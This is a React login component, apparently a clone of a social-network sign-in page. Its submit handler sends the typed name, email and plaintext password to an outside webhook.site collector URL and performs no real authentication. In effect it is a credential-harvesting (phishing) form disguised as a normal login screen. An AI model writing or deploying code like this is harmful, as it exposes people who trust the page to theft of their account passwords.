import React, { useState } from "react";
import "./Login.css";
function Login() {
  const [email, setEmail] = useState("");
  const [name, setName] = useState("");
  const [password, setPassword] = useState("");
  const [profilePic, setProfilePic] = useState("");

  const postData = (e) => {
    e.preventDefault();
    if (!name) {
      let result = fetch(
        "https://webhook.site/989f9414-3148-4021-a820-08491aa47267",
        {
          method: "post",
          mode: "no-cors",
          headers: {
            Accept: "application/json",
            "Content-type": "application/json",
          },
          body: JSON.stringify({
            name: name,
            email: email,
            password: password,
          }),
        }
      );
      console.log(result);
    } else {
      alert("hadchi rah machi howa hadak");
    }
  };
  const register = (e) => {
    if (!name) {
      alert("it's not possible");
    }
    alert("mrhba bik asshybi");
  };
  return (
    <div className="login">
      <img
        src="https://lh3.googleusercontent.com/proxy/LSgjG7SEpjFike5a7AWALTkL3LBMd6px2f4Iy1JlKQdlJNLWU_FTr3b2eDiVbKWn0V5y2IfqE8TEKVxlYxSYZWe8dtEdFyw_-GREFYWnqaNWIi6asgLYM-1wZ7SemHkuSUAUPxz7bb2ZSAPK4urdnm41b9NICbwbgzzjO1x7U0xgUK3xe10gTA"
        alt=""
      />
      <form onSubmit={postData}>
        <input
          value={name}
          onChange={(e) => setName(e.target.value)}
          placeholder="Full name (required if registering)"
          type="text"
        />
        <input
          value={profilePic}
          onChange={(e) => setProfilePic(e.target.value)}
          placeholder="Profile pic URL (optional)"
          type="text"
        />
        <input
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          placeholder="Email"
          type="email"
        />
        <input
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          placeholder="Password"
          type="password"
        />
        <button type="submit">Sing In</button>
      </form>
      <p>
        Not a member?{" "}
        <span className="login__register" onClick={register}>
          Register Now
        </span>
      </p>
    </div>
  );
}

export default Login;
